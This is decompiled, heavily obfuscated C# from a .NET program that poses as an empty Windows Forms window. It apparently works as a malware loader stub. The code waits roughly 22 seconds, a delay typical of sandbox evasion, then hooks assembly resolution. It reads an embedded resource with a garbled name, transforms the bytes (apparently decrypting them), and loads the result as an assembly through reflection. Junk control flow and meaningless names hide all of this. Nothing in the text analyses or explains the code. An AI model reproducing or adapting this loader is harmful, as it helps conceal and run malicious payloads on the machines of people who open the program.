using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using SHUV_002D3.Containers;

namespace SHUV_002D3.Serialization;

public class CandidatePolicySerializer : Form
{
	private IContainer m_Customer = null;

	private static CandidatePolicySerializer InsertContext;

	public CandidatePolicySerializer()
	{
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		int num = 0;
		int num3 = default(int);
		while (true)
		{
			int num2;
			if (num != 22)
			{
				ViewContext(1000);
				num++;
				num2 = 0;
				if (_003CModule_003E_007Bce07eb46_002D7fe1_002D4ead_002Dbc61_002D86bf4ccd807c_007D.m_4cfe68d180ad4f43b520bf31c4f43291 != 0)
				{
					continue;
				}
			}
			else
			{
				num2 = 1;
				if (_003CModule_003E_007Bce07eb46_002D7fe1_002D4ead_002Dbc61_002D86bf4ccd807c_007D.m_0034285ad78f4db39db98f76e2725cb7 != 0)
				{
					num2 = num3;
				}
			}
			switch (num2)
			{
			default:
				continue;
			case 1:
				DefineProducer();
				break;
			case 2:
				break;
			}
			break;
		}
		((Form)this).add_FormClosing(new FormClosingEventHandler(PublishProducer));
		CollectContext(this, new EventHandler(WriteProducer));
	}

	private void PublishProducer(object sender, CancelEventArgs e)
	{
		LogoutContext();
	}

	private void WriteProducer(object sender, EventArgs e)
	{
		((AppDomain)InterruptContext()).AssemblyResolve += MapProducer;
		AlgoAuthenticationContainer.CountProducer();
	}

	private Assembly MapProducer(object first, ResolveEventArgs pol)
	{
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Nbuujxdbv.Rjyqizekkumrq.dll");
		byte[] array = new byte[stream.Length];
		if (_003CModule_003E_007Bce07eb46_002D7fe1_002D4ead_002Dbc61_002D86bf4ccd807c_007D.m_5324286465d3410eb54e421ed3cc3325 != 0)
		{
			switch (0)
			{
			}
		}
		stream.Read(array, 0, array.Length);
		object[] instance = new object[1] { AlgoAuthenticationContainer.FillProducer(array) };
		return TestProducer(instance);
	}

	private Assembly TestProducer(object[] instance)
	{
		return (Assembly)CancelContext(AppDomain.CurrentDomain).InvokeMember("Load", BindingFlags.InvokeMethod, null, AppDomain.CurrentDomain, instance);
	}

	protected override void Dispose(bool testinfo)
	{
		int num;
		if (testinfo && m_Customer != null)
		{
			num = 0;
			if (_003CModule_003E_007Bce07eb46_002D7fe1_002D4ead_002Dbc61_002D86bf4ccd807c_007D.m_cbae4cc0775e4e529a6efd92a4fc2807 == 0)
			{
				goto IL_001e;
			}
			goto IL_003a;
		}
		goto IL_0049;
		IL_001e:
		CalculateContext(m_Customer);
		num = 1;
		if (_003CModule_003E_007Bce07eb46_002D7fe1_002D4ead_002Dbc61_002D86bf4ccd807c_007D.m_ce151a3362a94395beb4abd86f4cf6b2 == 0)
		{
			int num2 = default(int);
			num = num2;
		}
		goto IL_003a;
		IL_0049:
		((Form)this).Dispose(testinfo);
		return;
		IL_003a:
		switch (num)
		{
		case 1:
			goto IL_0049;
		}
		goto IL_001e;
	}

	private void DefineProducer()
	{
		m_Customer = new Container();
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		if (_003CModule_003E_007Bce07eb46_002D7fe1_002D4ead_002Dbc61_002D86bf4ccd807c_007D.m_00e445fde6e6418c92bf366ce0249d4f != 0)
		{
			switch (0)
			{
			}
		}
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).set_Text("Form1");
	}

	internal static void ViewContext(int int_0)
	{
		Thread.Sleep(int_0);
	}

	internal static void CollectContext(object object_0, object object_1)
	{
		((Form)object_0).add_Load((EventHandler)object_1);
	}

	internal static bool ReadContext()
	{
		return InsertContext == null;
	}

	internal static CandidatePolicySerializer EnableContext()
	{
		return InsertContext;
	}

	internal static void LogoutContext()
	{
		AlgoAuthenticationContainer.PostProducer();
	}

	internal static object InterruptContext()
	{
		return AppDomain.CurrentDomain;
	}

	internal static Type CancelContext(object object_0)
	{
		return ((AppDomain)object_0).GetType();
	}

	internal static void CalculateContext(object object_0)
	{
		((IDisposable)object_0).Dispose();
	}
}
